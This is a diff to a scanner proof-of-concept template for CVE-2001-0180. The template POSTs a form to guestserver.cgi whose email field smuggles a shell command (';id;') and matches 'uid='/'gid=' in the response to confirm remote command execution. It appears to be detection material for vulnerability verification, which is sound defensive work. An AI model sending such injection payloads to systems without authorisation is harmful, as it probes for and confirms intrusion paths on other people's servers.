@@ -1,24 +1,58 @@
 [info]
 author = "ave"
-description = "AVE-2001-0908 verification"
+description = "Lars Ellingsen guestserver.cgi 远程命令执行漏洞验证，通过 email 参数注入 shell 元字符执行任意命令"
 id = "POC-AVE-2001-0908"
-name = "PoC for AVE-2001-0908"
-severity = "medium"
+name = "CVE-2001-0180 PoC"
+severity = "critical"
 tags = ["ave-2001-0908"]
-vuln_id = ["AVE-2001-0908"]
+vuln_id = [
+    "CVE-2001-0180",
+    "AVE-2001-0908",
+]
 
 [poc]
 logic = "all"
 
 [[poc.requests]]
-method = "GET"
-path = "/cgi-bin/printenv"
+method = "POST"
+path = "/cgi-bin/guestserver.cgi"
 protocol = "http"
 
+[poc.requests.body]
+content = "email=test%40example.com%3Bid%3B&submit=Sign+Guestbook"
+type = "form"
+
 [poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
 User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
-status = [200]
-type = "status"
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "gid=",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/guestserver.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "email=test%40example.com%3Bid%3B&submit=Sign+Guestbook"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "gid=",
+]
